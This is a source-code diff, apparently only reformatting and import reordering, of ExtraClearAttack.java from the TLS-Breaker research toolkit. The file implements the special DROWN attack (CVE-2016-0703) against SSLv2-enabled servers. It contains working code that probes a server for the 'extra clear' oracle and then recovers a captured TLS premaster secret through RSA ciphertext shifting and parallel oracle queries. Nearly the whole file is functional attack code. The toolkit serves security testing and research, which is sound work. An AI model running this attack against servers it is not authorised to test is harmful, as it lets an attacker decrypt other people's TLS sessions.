@@ -1,12 +1,11 @@
-/**
+/*
  * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
  *
- * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
+ * Copyright 2021-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
  *
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
-
 package de.rub.nds.tlsbreaker.drownattack.impl.drown;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
@@ -14,10 +13,6 @@ import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.modifiablevariable.util.Modifiable;
-import de.rub.nds.tlsbreaker.drownattack.config.SpecialDrownCommandConfig;
-import de.rub.nds.tlsbreaker.breakercommons.constants.DrownVulnerabilityType;
-import de.rub.nds.tlsbreaker.breakercommons.exception.AttackFailedException;
-import de.rub.nds.tlsbreaker.drownattack.pkcs1.oracles.ExtraClearDrownOracle;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.Bits;
 import de.rub.nds.tlsattacker.core.constants.HandshakeMessageType;
@@ -34,6 +29,10 @@ import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
 import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
+import de.rub.nds.tlsbreaker.breakercommons.constants.DrownVulnerabilityType;
+import de.rub.nds.tlsbreaker.breakercommons.exception.AttackFailedException;
+import de.rub.nds.tlsbreaker.drownattack.config.SpecialDrownCommandConfig;
+import de.rub.nds.tlsbreaker.drownattack.pkcs1.oracles.ExtraClearDrownOracle;
 import java.math.BigInteger;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -43,7 +42,6 @@ import java.util.concurrent.ExecutorCompletionService;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.Future;
-
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -70,8 +68,8 @@ class ExtraClearAttack {
     }
 
     /**
-     * Checks if an arbitrary number of clear-text bytes can be included in the handshake. This bug is known as "extra
-     * clear" oracle (CVE-2016-0703). It can even work for non-export ciphers.
+     * Checks if an arbitrary number of clear-text bytes can be included in the handshake. This bug
+     * is known as "extra clear" oracle (CVE-2016-0703). It can even work for non-export ciphers.
      *
      * @return Indication whether the server is vulnerable to the "extra clear" oracle attack
      */
@@ -79,31 +77,36 @@ class ExtraClearAttack {
         SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
 
         // Overwrite all but 1 byte of the full key with null bytes
-        int clearKeyLength = cipherSuite.getClearKeyByteNumber() + cipherSuite.getSecretKeyByteNumber() - 1;
+        int clearKeyLength =
+                cipherSuite.getClearKeyByteNumber() + cipherSuite.getSecretKeyByteNumber() - 1;
         byte[] clearKey = new byte[clearKeyLength];
         ModifiableByteArray clearKeyData = Modifiable.explicit(clearKey);
         SSL2ClientMasterKeyMessage clientMasterKeyMessage = new SSL2ClientMasterKeyMessage();
         clientMasterKeyMessage.setClearKeyData(clearKeyData);
 
-        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
-            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
+        WorkflowTrace trace =
+                new WorkflowConfigurationFactory(tlsConfig)
+                        .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
         trace.addTlsAction(new SendAction(clientMasterKeyMessage));
         trace.addTlsAction(new ReceiveAction(new SSL2ServerVerifyMessage()));
         State state = new State(tlsConfig, trace);
 
         WorkflowExecutor workflowExecutor =
-            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+                WorkflowExecutorFactory.createWorkflowExecutor(
+                        tlsConfig.getWorkflowExecutorType(), state);
         workflowExecutor.executeWorkflow();
 
         if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SSL2_SERVER_HELLO, trace)) {
             return DrownVulnerabilityType.NONE;
         }
 
-        SSL2ServerVerifyMessage serverVerifyMessage = (SSL2ServerVerifyMessage) WorkflowTraceUtil
-            .getFirstReceivedMessage(HandshakeMessageType.SSL2_SERVER_VERIFY, trace);
+        SSL2ServerVerifyMessage serverVerifyMessage =
+                (SSL2ServerVerifyMessage)
+                        WorkflowTraceUtil.getFirstReceivedMessage(
+                                HandshakeMessageType.SSL2_SERVER_VERIFY, trace);
 
         if (serverVerifyMessage != null
-            && ServerVerifyChecker.check(serverVerifyMessage, state.getTlsContext(), true)) {
+                && ServerVerifyChecker.check(serverVerifyMessage, state.getTlsContext(), true)) {
             return DrownVulnerabilityType.SPECIAL;
         }
 
@@ -128,29 +131,39 @@ class ExtraClearAttack {
             pmsIndex++;
         }
         if (c1 == null) {
-            throw new AttackFailedException("Could not convert any Premaster secret to an SSLv2-conformant ciphertext");
+            throw new AttackFailedException(
+                    "Could not convert any Premaster secret to an SSLv2-conformant ciphertext");
         }
-        CONSOLE.info("Step 1 completed, converted Premaster secret #" + pmsIndex + " to ENCRYPTED-KEY-DATA");
+        CONSOLE.info(
+                "Step 1 completed, converted Premaster secret #"
+                        + pmsIndex
+                        + " to ENCRYPTED-KEY-DATA");
 
         byte[] m1 = step2(c1);
         if (m1 == null) {
-            throw new AttackFailedException("Could not determine plaintext for converted ciphertext");
+            throw new AttackFailedException(
+                    "Could not determine plaintext for converted ciphertext");
         }
         CONSOLE.info("Step 2 completed, determined plaintext for converted ciphertext");
 
         byte[] m0 = step3(m1);
         CONSOLE.info("Step 3 completed, converted SECRET-KEY-DATA back to Premaster secret");
-        CONSOLE.info("(Padded) plaintext Premaster secret #" + pmsIndex + " is:"
-            + ArrayConverter.bytesToHexString(m0, true, true));
+        CONSOLE.info(
+                "(Padded) plaintext Premaster secret #"
+                        + pmsIndex
+                        + " is:"
+                        + ArrayConverter.bytesToHexString(m0, true, true));
     }
 
     private void initRsaParams() {
         // Do minimal SSLv2 handshake
-        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
-            .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
+        WorkflowTrace trace =
+                new WorkflowConfigurationFactory(tlsConfig)
+                        .createWorkflowTrace(WorkflowTraceType.SSL2_HELLO, RunningModeType.CLIENT);
         State state = new State(tlsConfig, trace);
         WorkflowExecutor workflowExecutor =
-            WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+                WorkflowExecutorFactory.createWorkflowExecutor(
+                        tlsConfig.getWorkflowExecutorType(), state);
         workflowExecutor.executeWorkflow();
 
         // Information from the server certificate should be in the context now
@@ -165,13 +178,13 @@ class ExtraClearAttack {
     }
 
     /**
-     * Step (1) of the attack according to section 5.2.1 of the DROWN paper: Try to convert a TLS Premaster secret to
-     * SSLv2 ENCRYPTED-KEY-DATA. (Details and nomenclature given in section 3.2.1.)
+     * Step (1) of the attack according to section 5.2.1 of the DROWN paper: Try to convert a TLS
+     * Premaster secret to SSLv2 ENCRYPTED-KEY-DATA. (Details and nomenclature given in section
+     * 3.2.1.)
      *
-     * @param  premasterSecret
-     *                         A captured TLS Premaster secret
-     * @return                 The Premaster secret converted to ENCRYPTED-KEY-DATA, or null if no conversion succeeded
-     *                         within the given limits
+     * @param premasterSecret A captured TLS Premaster secret
+     * @return The Premaster secret converted to ENCRYPTED-KEY-DATA, or null if no conversion
+     *     succeeded within the given limits
      */
     private byte[] step1(byte[] premasterSecret) {
         BigInteger c0 = new BigInteger(premasterSecret);
@@ -204,14 +217,13 @@ class ExtraClearAttack {
     }
 
     /**
-     * Step (2) of the attack according to section 5.2.1 of the DROWN paper: Use rotations to iteratively learn the
-     * plaintext. This also includes the initial plaintext recovery (before rotations), which is extensively described
-     * in section 5.1 but omitted in section 5.2.1. (Details and nomenclature for the rotations given in section 3.2.2
-     * and appendix A.3.)
+     * Step (2) of the attack according to section 5.2.1 of the DROWN paper: Use rotations to
+     * iteratively learn the plaintext. This also includes the initial plaintext recovery (before
+     * rotations), which is extensively described in section 5.1 but omitted in section 5.2.1.
+     * (Details and nomenclature for the rotations given in section 3.2.2 and appendix A.3.)
      *
-     * @param  c1
-     *            (Encrypted) TLS Premaster secret converted to SSLv2 ENCRYPTED-KEY-DATA
-     * @return    The cleartext for c1, or null if an error occurred
+     * @param c1 (Encrypted) TLS Premaster secret converted to SSLv2 ENCRYPTED-KEY-DATA
+     * @return The cleartext for c1, or null if an error occurred
      */
     private byte[] step2(byte[] c1) {
         SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
@@ -219,7 +231,8 @@ class ExtraClearAttack {
         BigInteger rsaE = serverPublicKey;
         BigInteger modulus = serverModulus;
         int lenN = serverModulus.bitLength() / Bits.IN_A_BYTE;
-        BigInteger bleichenbacherB = BigInteger.valueOf(2).modPow(BigInteger.valueOf(8 * (lenN - 2)), modulus);
+        BigInteger bleichenbacherB =
+                BigInteger.valueOf(2).modPow(BigInteger.valueOf(8 * (lenN - 2)), modulus);
         int lenK = cipherSuite.getSecretKeyByteNumber();
         // The DROWN paper says this needs to be `2^(8 (k + 1))`, which is
         // obviously a typo; it should also work with `2^(8 (lenK + 1))`, though
@@ -253,19 +266,30 @@ class ExtraClearAttack {
             // Shift plaintext bounds and ciphertext
             knownPlaintext = knownPlaintext.multiply(inverseR).mod(modulus);
             BigInteger shiftedCiphertext =
-                new BigInteger(ciphertext).multiply(inverseR.modPow(rsaE, modulus)).mod(modulus);
+                    new BigInteger(ciphertext)
+                            .multiply(inverseR.modPow(rsaE, modulus))
+                            .mod(modulus);
             ciphertext = ensurePositive(shiftedCiphertext.toByteArray());
             shiftCount++;
 
-            ExecutorCompletionService<BigInteger> completionService = new ExecutorCompletionService(executor);
+            ExecutorCompletionService<BigInteger> completionService =
+                    new ExecutorCompletionService(executor);
             List<ExtraClearStep2Callable> allCallables = new ArrayList();
             List<Future<BigInteger>> allFutures = new ArrayList();
             BigInteger s = null;
 
             for (int i = 0; i < threadNumber; i++) {
                 BigInteger initialSCandidate = BigInteger.valueOf(1 + i * 2);
-                ExtraClearStep2Callable callable = new ExtraClearStep2Callable(oracle, ciphertext, lenN, rsaE, modulus,
-                    initialSCandidate, candidateStepS, knownPlaintext);
+                ExtraClearStep2Callable callable =
+                        new ExtraClearStep2Callable(
+                                oracle,
+                                ciphertext,
+                                lenN,
+                                rsaE,
+                                modulus,
+                                initialSCandidate,
+                                candidateStepS,
+                                knownPlaintext);
                 allCallables.add(callable);
                 allFutures.add(completionService.submit(callable));
             }
@@ -292,26 +316,34 @@ class ExtraClearAttack {
                 return null;
             }
 
-            byte[] multipliedCiphertext = ArrayConverter.bigIntegerToByteArray(
-                s.modPow(rsaE, modulus).multiply(new BigInteger(ciphertext)).mod(modulus), lenN, true);
+            byte[] multipliedCiphertext =
+                    ArrayConverter.bigIntegerToByteArray(
+                            s.modPow(rsaE, modulus)
+                                    .multiply(new BigInteger(ciphertext))
+                                    .mod(modulus),
+                            lenN,
+                            true);
             // Called mk_secret in the DROWN paper
             byte[] multipliedNewPlaintext = recoverPlaintext(multipliedCiphertext);
 
             // Get rid of multiplier s
             BigInteger byteModuloExponent =
-                BigInteger.valueOf(multipliedNewPlaintext.length).multiply(BigInteger.valueOf(8));
+                    BigInteger.valueOf(multipliedNewPlaintext.length)
+                            .multiply(BigInteger.valueOf(8));
             BigInteger byteModulo = BigInteger.valueOf(2).modPow(byteModuloExponent, modulus);
             BigInteger numOfSubstractions = knownPlaintext.multiply(s).divide(modulus);
             // If everything else works alright, s should always have an
             // inverse under byteModulo
             BigInteger inverseS = s.modInverse(byteModulo);
-            BigInteger b = new BigInteger(ensurePositive(multipliedNewPlaintext))
-                .add(numOfSubstractions.multiply(modulus).mod(byteModulo));
+            BigInteger b =
+                    new BigInteger(ensurePositive(multipliedNewPlaintext))
+                            .add(numOfSubstractions.multiply(modulus).mod(byteModulo));
             BigInteger computedPlainLastBytes = b.multiply(inverseS).mod(byteModulo);
 
             // Update known plaintext
             newPlaintext =
-                ArrayConverter.bigIntegerToByteArray(computedPlainLastBytes, multipliedNewPlaintext.length, true);
+                    ArrayConverter.bigIntegerToByteArray(
+                            computedPlainLastBytes, multipliedNewPlaintext.length, true);
             knownPlaintext = updateKnownPlaintext(knownPlaintext, newPlaintext);
             knownLength += lenK;
             LOGGER.info("Step 2: Recovered " + knownLength + " of " + lenN + " bytes");
@@ -329,12 +361,11 @@ class ExtraClearAttack {
     }
 
     /**
-     * Step (3) of the attack according to section 5.2.1 of the DROWN paper: Convert decrypted SSLv2 SECRET-KEY-DATA
-     * back to TLS Premaster secret.
+     * Step (3) of the attack according to section 5.2.1 of the DROWN paper: Convert decrypted SSLv2
+     * SECRET-KEY-DATA back to TLS Premaster secret.
      *
-     * @param  m1
-     *            (Plaintext) SSLv2 SECRET-KEY-DATA
-     * @return    m1 converted back to a TLS Premaster secret
+     * @param m1 (Plaintext) SSLv2 SECRET-KEY-DATA
+     * @return m1 converted back to a TLS Premaster secret
      */
     private byte[] step3(byte[] m1) {
         BigInteger modulus = serverModulus;
@@ -346,12 +377,12 @@ class ExtraClearAttack {
     }
 
     /**
-     * Determines SECRET-KEY-DATA, i.e. the actual plaintext value of ENCRYPTED-KEY-DATA, after conversion of TLS
-     * Premaster secret to ENCRYPTED-KEY-DATA. The process is extensively described in section 5.1 of the DROWN paper.
+     * Determines SECRET-KEY-DATA, i.e. the actual plaintext value of ENCRYPTED-KEY-DATA, after
+     * conversion of TLS Premaster secret to ENCRYPTED-KEY-DATA. The process is extensively
+     * described in section 5.1 of the DROWN paper.
      *
-     * @param  encryptedKeyData
-     *                          An RSA ciphertext representing valid ENCRYPTED-KEY-DATA
-     * @return                  Recovered SECRET-KEY-DATA, i.e. the plaintext value of `encryptedKeyData`
+     * @param encryptedKeyData An RSA ciphertext representing valid ENCRYPTED-KEY-DATA
+     * @return Recovered SECRET-KEY-DATA, i.e. the plaintext value of `encryptedKeyData`
      */
     private byte[] recoverPlaintext(byte[] encryptedKeyData) {
         SSL2CipherSuite cipherSuite = tlsConfig.getDefaultSSL2CipherSuite();
@@ -375,26 +406,24 @@ class ExtraClearAttack {
     /**
      * Updates the currently known plaintext part with some new known bytes.
      *
-     * @param  oldPlaintext
-     *                      Previously known plaintext
-     * @param  newBytes
-     *                      New plaintext bytes
-     * @return              New known plaintext
+     * @param oldPlaintext Previously known plaintext
+     * @param newBytes New plaintext bytes
+     * @return New known plaintext
      */
     private static BigInteger updateKnownPlaintext(BigInteger oldPlaintext, byte[] newBytes) {
         byte[] plainBytes = ensurePositive(oldPlaintext.toByteArray());
-        System.arraycopy(newBytes, 0, plainBytes, plainBytes.length - newBytes.length, newBytes.length);
+        System.arraycopy(
+                newBytes, 0, plainBytes, plainBytes.length - newBytes.length, newBytes.length);
 
         return new BigInteger(plainBytes);
     }
 
     /**
-     * Makes sure that a byte array does not represent a negative number when creating a BigInteger from it. Will
-     * increase the array's length by 1.
+     * Makes sure that a byte array does not represent a negative number when creating a BigInteger
+     * from it. Will increase the array's length by 1.
      *
-     * @param  data
-     *              Array to work on
-     * @return      Copy of "data", with an additional leading zero
+     * @param data Array to work on
+     * @return Copy of "data", with an additional leading zero
      */
     protected static byte[] ensurePositive(byte[] data) {
         byte[] positiveData = new byte[data.length + 1];
@@ -402,5 +431,4 @@ class ExtraClearAttack {
 
         return positiveData;
     }
-
 }
